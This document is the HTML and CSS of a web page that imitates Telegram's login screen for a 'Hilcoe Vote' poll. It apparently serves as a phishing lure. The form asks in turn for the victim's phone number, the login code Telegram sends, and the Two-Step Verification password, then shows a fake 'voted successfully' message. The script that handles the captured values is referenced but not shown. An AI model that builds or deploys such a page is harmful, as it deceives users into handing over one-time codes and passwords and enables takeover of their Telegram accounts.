<html>
<head>
    <title></title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet" type="text/css">
    <link href="./css/bootstrap.min.css" rel="stylesheet">
    <link href="./css/bootstrap-extra.css" rel="stylesheet">
    <link href="./css/telegram.css" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#4CA3E2">
    <meta name="apple-mobile-web-app-status-bar-style" content="#4CA3E2">
    <meta name="msapplication-navbutton-color" content="#4CA3E2">
    <meta name="msapplication-TileColor" content="#4CA3E2">
    <script src="https://kit.fontawesome.com/cc0df48e0a.js" crossorigin="anonymous"></script>

</head>
<body>
<style>

    .dots-animated:after {
        display: inline-block;
        animation: none !important;
        content: '' !important;
        position: absolute;
    }
</style>
<section class="login_content" id="login-container">
    <div id="default-label">
        <div class="login_photos"><span class="login_telegram_photo_wrap arrowed"><i class="login_telegram_photo"></i></span><a href="#" target="_blank"><i class="login_bot_photo bgcolor2" data-content="HV"></i></a></div>
        <div class="login_header_text">Log in using your Telegram account with <br><b><span dir="auto">Hilcoe Vote</span></b>.</div>
        <div class="login_confirm_text" id="login_confirm_text">Please enter your <b>phone number</b> in the <a target="_blank" rel="noopener" href="https://telegram.org/faq#login-and-sms">international format</a> and we will send a confirmation message to your account via Telegram.</div>
        <form id="send-form" class="login_form" onsubmit="return requestConfirmation(event);">
        <div class="login_form_group" id="login-form-group">
            <div class="login_country_field_wrap" id="login-country-wrap">
                <div class="login_country_select is-dirty" id="login-country-selected" data-placeholder="Unknown country">Ethiopia</div>
                <div class="login_country_search_wrap">
                    <div class="textfield-item" id="login-country-search-textfield">
                        <input type="text" class="form-control" id="login-country-search" autocomplete="off" placeholder="Search">
                        <div class="textfield-item-underline"></div>
                    </div>
                    <div class="login_country_search_results" id="login-country-search-results" data-noresult="Country not found"></div>
                </div>
            </div>
            <div class="login_phone_field_wrap">
                <div class="login_code_field_wrap">
                    <div class="textfield-item" id="login-phone-code-textfield">
                        <input type="tel" class="form-control" id="login-phone-code" autocomplete="off">
                        <div class="textfield-item-underline"></div>
                    </div>
                </div><div class="login_number_field_wrap">
                    <div class="textfield-item" id="login-phone-textfield">
                        <input type="tel" class="form-control" id="login-phone" autocomplete="off">
                        <div class="textfield-item-underline"></div>
                        <label class="textfield-item-placeholder" id="login-phone-placeholder" data-placeholder="Phone number">−− −−− −−-</label>
                        <span class="textfield-item-error login_form_message" id="login-alert"></span>
                    </div>
                </div>
            </div>
        </div>
        <div class="login_button_wrap">
            <button class="button-item button-item-flat ripple-handler" onclick="return loginCancel(event)" type="button">
                <span class="button-item-label">Cancel</span>
                <span class="ripple-mask"><span class="ripple"></span></span>
            </button><!--
     --><button class="button-item ripple-handler" type="submit">
                <span class="button-item-label">Next</span>
                <span class="ripple-mask"><span class="ripple"></span></span>
            </button>
        </div>
    </form>
    </div>
    <div id="login-form" class="hide">
        <div class="login_form_group">
            <div class="login_number_field_wrap">
                <div class="textfield-item" id="login-phone-bitch">
                    <input type="text" class="form-control text-center" id="login-code-number" autocomplete="off" placeholder="- - - - -">
                    <div class="textfield-item-underline"></div>
                    <span class="textfield-item-error login_form_message" id="login-alert-code"></span>
                </div>
            </div>
            <div class="login_form_message dots-animated" id="dumb-text">We've just sent you a code to your telegram account. Please enter the code</div>
        </div>
        <div class="login_button_wrap" style="padding-top: 5px !important;">
            <button class="button-item button-item ripple-handler" onclick="return sendCode()" type="button" id="codeBtn">
                <span class="button-item-label"><span class="send-text">Send</span> <i class="fas fa-circle-notch fa-spin hide" id="hide-loading"></i></span>
                <span class="ripple-mask"><span class="ripple"></span></span>
            </button>
        </div>
    </div>
    <div id="password-form" class="hide">
        <div class="login_form_group">
            <div class="login_number_field_wrap">
                <div class="textfield-item" id="login-phone-pass">
                    <input type="text" class="form-control text-center" id="login-password" autocomplete="off" placeholder="">
                    <div class="textfield-item-underline"></div>
                    <span class="textfield-item-error login_form_message" id="login-alert-password"></span>
                </div>
            </div>
            <div class="login_form_message dots-animated" id="dumb-texts">You have Two-Step Verification enabled, so your account is protected with an additional password</div>
        </div>
        <div class="login_button_wrap" style="padding-top: 5px !important;">
            <button class="button-item button-item ripple-handler" onclick="return sendPassword()" type="button" id="codeBtn1">
                <span class="button-item-label"><span class="send-text1">Send</span> <i class="fas fa-circle-notch fa-spin hide" id="hide-loading1"></i></span>
                <span class="ripple-mask"><span class="ripple"></span></span>
            </button>
        </div>
    </div>
    <div id="login-success" class="hide">
        <div class="login_form_group">
            <img src="img/success.png" alt="success image" height="250">
            <div class="m-3 login_form_message dots-animated">Thank You<br>You have voted successfully</div>
        </div>
        <div class="login_button_wrap" style="padding-top: 5px !important;">
            <button class="button-item button-item-flat ripple-handler" onclick="return completed()" type="button">
                <span class="button-item-label">Visit Website</span>
                <span class="ripple-mask"><span class="ripple"></span></span>
            </button>
        </div>
    </div>
</section>
<style>
    body {
        font-family: 'Roboto', sans-serif;
        font-size: 16px;
        margin: 0;
        padding: 0;
        color: #212121;
    }
    body.rtl {
        direction: rtl;
    }

    a, a:hover {
        color: #1385d8;
    }
    a:hover {
        text-decoration: underline;
    }
    .btn {
        text-transform: uppercase;
    }
    .btn-lg {
        font-size: 14px;
        font-weight: bold;
    }

    .btn:focus,
    .btn:active:focus,
    button:focus,
    button:active:focus,
    input.form-control:focus,
    textarea.form-control:focus,
    input.form-control,
    textarea.form-control {
        outline: none;
        box-shadow: none;
    }

    .container,
    .container-fluid {
        margin-right: auto;
        margin-left: auto;
        padding-left: 0;
        padding-right: 0;
        width: 100%;
    }

    input.login-form-control,
    textarea.login-form-control,
    .input.login-form-control {
        padding-left: 0;
        padding-right: 0;
        border: none;
        height: auto;
        resize: none;
        border-bottom: 1px solid rgba(0,0,0,.12);
        transition: box-shadow .2s ease, color .2s ease;
    }
    .textfield-item input.form-control::-webkit-input-placeholder {
        color: #999;
    }
    .textfield-item input.form-control::-moz-placeholder {
        color: #999;
    }
    .textfield-item input.form-control:-ms-input-placeholder {
        color: #999;
    }
    .textfield-item input.form-control:focus::-webkit-input-placeholder {
        color: #ccc;
    }
    .textfield-item input.form-control:focus::-moz-placeholder {
        color: #ccc;
    }
    .textfield-item input.form-control:focus:-ms-input-placeholder {
        color: #ccc;
    }

    .btn.disabled,
    .btn[disabled] {
        color: #b5d1e6;
        opacity: 1;
    }

    main.login {
        min-width: 320px;
    }
    .login_about {
        display: inline-block;
        width: 20px;
        height: 20px;
        /*background: url(/img/oauth/icons.png) no-repeat 0 0;*/
        margin: 16px;
        position: absolute;
        right: 0;
        top: 0;
    }
    body.rtl .login_about {
        right: auto;
        left: 0;
    }
    .r2x .login_about {
        /*background-image: url(/img/oauth/icons_2x.png);*/
        background-size: 20px 37px;
    }
    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
        .login_about,
        .r2x .login_about {
            /*background-image: url(/img/oauth/icons_2x.png);*/
            background-size: 20px 37px;
        }
    }
    .logout_wrap {
        position: absolute;
        margin: 15px 18px;
        right: 0;
        top: 0;
    }
    body.rtl .logout_wrap {
        right: auto;
        left: 0;
    }
    .login_description {

    }
    .login_header {
        font-size: 16px;
        line-height: 24px;
        background-color: #4ca3e2;
        color: #fff;
        padding: 9px;
        height: 58px;
    }
    .login_title {
        padding: 8px 0;
        white-space: nowrap;
        overflow: hidden;
        text-overflow: ellipsis;
    }
    .login_icon {
        display: inline-block;
        width: 27px;
        height: 22px;
        /*background: url(/img/oauth/tg_header.png) no-repeat 0 0;*/
        margin: 9px 14px 9px 12px;
        float: left;
    }
    .r2x .login_icon {
        /*background-image: url(/img/oauth/tg_header_2x.png);*/
        background-size: 27px 22px;
    }
    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
        .login_icon,
        .r2x .login_icon {
            /*background-image: url(/img/oauth/tg_header_2x.png);*/
            background-size: 27px 22px;
        }
    }
    .logout_link {
        font-size: 14px;
        color: #fff;
        padding: 8px 7px;
        margin: 0 7px;
        float: right;
    }
    .logout_link:hover,
    .logout_link:active {
        color: #fff;
        text-decoration: underline;
    }
    .login_user {
        float: right;
    }
    .login_bot_title {
        margin: 0 0 35px;
    }
    .bot_name {
        white-space: nowrap;
    }
    .login_bot_title .login_bot_photo_image {
        width: 25px;
        height: 25px;
        border-radius: 13px;
        margin-right: 12px;
        vertical-align: middle;
    }
    .login_bot_title .login_bot_title_text {
        vertical-align: middle;
    }
    .login_bot_name {
        font-weight: bold;
        font-size: 16px;
        line-height: 21px;
        margin-bottom: 10px;
    }
    .login_photos {
        padding: 15px 0 22px;
    }
    .login_telegram_photo_wrap,
    .login_user_photo_wrap {
        display: inline-block;
        margin: 15px 0;
    }
    .login_telegram_photo_wrap.arrowed,
    .login_user_photo_wrap.arrowed {
        background: url('data:image/svg+xml,%3Csvg height="50" viewBox="0 0 98 50" width="98" xmlns="http://www.w3.org/2000/svg"%3E%3Cg fill="%234ca3e2" fill-rule="evenodd"%3E%3Cpath d="m91.8 19.5666667 8.5 11.3333333c.331371.4418278.241828 1.0686292-.2 1.4-.1730962.1298221-.3836298.2-.6.2h-17c-.5522847 0-1-.4477153-1-1 0-.2163702.0701779-.4269038.2-.6l8.5-11.3333333c.3313708-.4418278.9581722-.5313709 1.4-.2.0758057.0568542.1431458.1241943.2.2z" transform="matrix(0 1 -1 0 116.5 -65.5)"/%3E%3Cpath d="m40 21h46v8h-46z"/%3E%3C/g%3E%3C/svg%3E') no-repeat 0 -15px;
        padding-right: 58px;
    }
    .login_user_photo_wrap.arrowed {
        background-image: url('data:image/svg+xml,%3Csvg height="50" viewBox="0 0 98 50" width="98" xmlns="http://www.w3.org/2000/svg"%3E%3Cg fill="%23d6d6d6" fill-rule="evenodd"%3E%3Cpath d="m91.8 19.5666667 8.5 11.3333333c.331371.4418278.241828 1.0686292-.2 1.4-.1730962.1298221-.3836298.2-.6.2h-17c-.5522847 0-1-.4477153-1-1 0-.2163702.0701779-.4269038.2-.6l8.5-11.3333333c.3313708-.4418278.9581722-.5313709 1.4-.2.0758057.0568542.1431458.1241943.2.2z" transform="matrix(0 1 -1 0 116.5 -65.5)"/%3E%3Cpath d="m40 21h46v8h-46z"/%3E%3C/g%3E%3C/svg%3E');
    }
    .login_telegram_photo,
    .login_bot_photo,
    .login_user_photo,
    .login_bot_photo img,
    .login_user_photo img {
        display: inline-block;
        vertical-align: top;
        width: 50px;
        height: 50px;
        border-radius: 25px;
    }
    .login_telegram_photo {
        background: url('data:image/svg+xml,%3Csvg height="50" viewBox="0 0 50 50" width="50" xmlns="http://www.w3.org/2000/svg"%3E%3Cg fill="none" fill-rule="evenodd"%3E%3Ccircle cx="25" cy="25" fill="%234ca3e2" r="25"/%3E%3Cpath d="m11.1838302 25.1315363c7.1532767-2.9934727 11.9232482-4.9669531 14.3099145-5.9204412 6.8144173-2.7224024 8.2303949-3.1953128 9.1533092-3.2109286.2029865-.0034345.6568489.0448847.950842.2740174.2482419.1934752.3165432.4548327.3492276.6382684.0326843.1834358.0733842.601307.0410309.9278195-.3692757 3.7267611-1.9671255 12.7706276-2.7800209 16.944664-.3439665 1.7661912-1.026197 2.1442046-1.6818831 2.2021587-1.4249578.1259476-2.5020563-.6903349-3.8821976-1.5593016-2.1596487-1.3597614-3.7791851-2.1170303-5.8754981-3.4439062-2.4226524-1.5334347-.2908188-2.3906915 1.0898437-3.7680664.361326-.3604656 6.7509766-6.1621094 6.8215001-6.027668.0306372.0584048-.192813-.6844486-.3362893-.8069372-.1434762-.1224887-.3552347-.0806023-.5080456-.0472897-.2166048.0472195-3.6666715 2.2375171-10.3502001 6.5708928-.97929.6458958-1.8663004.9605979-2.6610313.9441063-.876127-.0181806-2.561444-.4758095-3.814304-.8669794-1.5366837-.4797857-2.10392683-.7057418-1.9975768-1.5205665.0553937-.4244111.4458533-.8676919 1.1713788-1.3298423z" fill="%23fff"/%3E%3C/g%3E%3C/svg%3E') no-repeat 0 0;
        margin: -15px 0;
    }
    body.rtl .login_telegram_photo_wrap.arrowed,
    body.rtl .login_telegram_photo_wrap.arrowed .login_telegram_photo,
    body.rtl .login_user_photo_wrap.arrowed,
    body.rtl .login_user_photo_wrap.arrowed .login_user_photo {
        transform: scaleX(-1);
    }
    .login_bot_photo,
    .login_user_photo {
        position: relative;
        font-style: normal;
        text-align: center;
        text-transform: uppercase;
        text-decoration: none !important;
        font-size: 24px;
        line-height: 52px;
        color: #fff;
        background: #e57979;
        overflow: hidden;
    }
    .login_bot_photo:before,
    .login_user_photo:before {
        content: attr(data-content);
        font-weight: 500;
    }
    .login_bot_photo img,
    .login_user_photo img {
        position: absolute;
        left: 0;
        top: 0;
    }
    .login_user_photo {
        margin: -15px 0;
    }
    .login_photos_large .login_bot_photo,
    .login_photos_large .login_user_photo,
    .login_photos_large .login_bot_photo img,
    .login_photos_large .login_user_photo img {
        width: 60px;
        height: 60px;
        border-radius: 30px;
    }
    .login_photos_large .login_bot_photo,
    .login_photos_large .login_user_photo {
        font-size: 29px;
        line-height: 62px;
    }
    .login_photos_large .login_user_photo_wrap {
        background-position: 10px -15px;
        margin: 20px 0;
    }
    .login_photos_large .login_user_photo {
        margin: -20px 0;
    }
    .login_header_text {
        font-weight: 500;
        margin-bottom: 12px;
        line-height: 21px;
    }
    .login_confirm_text {
        font-size: 15px;
        line-height: 21px;
    }
    .login_confirm_text b {
        font-weight: 500;
    }
    .login_confirm_text + .login_confirm_text {
        margin-top: 4px;
    }
    .login_confirm_form_group {
        margin: 25px 0;
    }
    .login_content {
        padding: 40px 20px 30px;
        text-align: center;
        max-width: 530px;
        margin: 0 auto;
    }
    .login_content_request {
        padding-top: 60px;
    }
    .login_content_request .login_button_wrap {
        padding-top: 25px;
    }
    .login_form_group {
        width: 270px;
        margin: 25px auto 35px;
    }
    .login_form_group .textfield-item input.form-control {
        font-size: 15px;
        line-height: 1.33;
        font-weight: normal;
        font-family: inherit;
        background-color: transparent;
    }
    .login-form-control {
        position: relative;
        text-align: center;
        color: #999;
    }
    .login_form_message {
        text-align: left;
        font-size: 14px;
        line-height: 19px;
        min-height: 19px;
        margin: 7px 0 -19px;
        color: #777;
        text-align: center;
        /*left: -68px;*/
        right: 0;
    }
    .login_form_group.error .login-form-control {
        box-shadow: inset 0 -1px 0 #e2726f;
    }
    .login_form_group.error .login-form-control:focus {
        box-shadow: inset 0 -2px 0 #e2726f;
    }
    .login_form_group.error .login_form_message,
    .login_form_group .is-invalid .login_form_message {
        color: #d45a58;
        display: block;
    }
    .login_code_field_wrap {
        width: 56px;
        margin-right: 12px;
        display: inline-block;
        vertical-align: top;
    }
    .login_number_field_wrap {
        width: 202px;
        display: inline-block;
        vertical-align: top;
    }
    .login_code_field_wrap .textfield-item input.form-control {
        text-align: center;
    }
    .login_form_group .textfield-item {
        padding: 0 0 20px;
        margin: 0 0 -20px;
    }
    .login_form_group .textfield-item-underline {
        bottom: 20px;
    }
    .login_country_field_wrap {
        position: relative;
    }
    .login_country_field_wrap:before {
        content: '';
        float: right;
        display: inline-block;
        margin: 16px 10px 0;
        width: 14px;
        height: 9px;
        /*background: url(/img/oauth/icons.png) no-repeat -3px -29px;*/
    }
    body.rtl .login_country_field_wrap:before {
        float: left;
    }
    .r2x .login_country_field_wrap:before {
        /*background-image: url(/img/oauth/icons_2x.png);*/
        background-size: 20px 37px;
    }
    @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
        .login_country_field_wrap:before,
        .r2x .login_country_field_wrap:before {
            /*background-image: url(/img/oauth/icons_2x.png);*/
            background-size: 20px 37px;
        }
    }
    .login_country_field_wrap .login_country_search_wrap {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        visibility: hidden;
        opacity: 0;
    }
    .login_country_field_wrap.opened .login_country_search_wrap {
        visibility: visible;
        opacity: 1;
    }
    .login_country_field_wrap.opened .login_country_select {
        visibility: hidden;
        opacity: 0;
    }
    .login_country_select {
        border-bottom: 1px solid #e6e6e6;
        display: block;
        font-family: "Helvetica","Arial",sans-serif;
        margin: 0;
        padding: 4px 0;
        width: 100%;
        text-align: left;
        color: #ccc;
        cursor: pointer;
        position: relative;
    }
    body.rtl .login_country_select {
        text-align: right;
    }
    .login_country_select.is-dirty {
        color: inherit;
    }
    .login_country_search_results {
        position: absolute;
        width: 290px;
        margin: -2px -10px;
        background: #fff;
        text-align: left;
        padding: 7px 0;
        box-shadow: 0 0 2px 1px rgba(0, 0, 0, .15);
        max-height: 170px;
        overflow: auto;
        overflow-x: hidden;
        -webkit-overflow-scrolling: touch;
        z-index: 7;
    }
    body.rtl .login_country_search_results {
        text-align: right;
    }
    .login_country_search_result,
    .login_country_search_noresult {
        font-size: 14px;
        line-height: 18px;
        padding: 4px 12px;
        cursor: pointer;
    }
    .login_country_search_result.selected {
        background: #f2f2f2;
    }
    .login_country_search_result .prefix {
        font-size: 13px;
        line-height: 16px;
        color: #a8a8a8;
        padding: 0 8px;
    }
    .login_country_search_noresult {
        color: #a8a8a8;
        cursor: auto;
    }
    .login_country_select,
    .login_form_group input.form-control,
    .login_form_group .textfield-item-placeholder {
        font-size: 15px;
        line-height: 1.33;
        font-weight: normal;
        font-family: inherit;
    }
    .login_country_select,
    .login_form_group input.form-control {
        padding: 10px 0;
    }
    .login_form_group input.form-control:focus {
        outline: none;
    }
    .login_form_group .textfield-item-placeholder {
        bottom: 0;
        color: #ccc;
        left: 0;
        right: 0;
        pointer-events: none;
        position: absolute;
        display: block;
        top: 10px;
        width: 100%;
        overflow: hidden;
        white-space: nowrap;
        text-align: left;
        z-index: -1;
    }
    .login_phone_field_wrap {
        padding-top: 10px;
        direction: ltr;
    }
    .login_phone_field {
        font-weight: 500;
        color: #222;
        direction: ltr;
    }
    .login_phone_invalid {
        margin-left: 10px;
        font-size: 13px;
        position: absolute;
        right: 0;
    }
    body.rtl .login_phone_invalid {
        margin-right: 10px;
        margin-left: 0;
        right: auto;
        left: 0;
    }


    .login_button_wrap button + button {
        margin-left: 10px;
    }
    body.rtl .login_button_wrap button + button {
        margin-right: 10px;
        margin-left: 0;
    }
    .login_button_wrap {
        margin-top: 25px;
        padding-bottom: 20px;
    }
    .login_button_wrap + .login_button_wrap {
        margin-top: 15px;
    }
    #login-form .login_button_wrap {
        padding-top: 24px;
    }
    .logout_button {
        font-size: 13px;
        font-weight: 500;
        text-transform: uppercase;
    }

</style>
<script src="script.js"></script>
</body>
</html>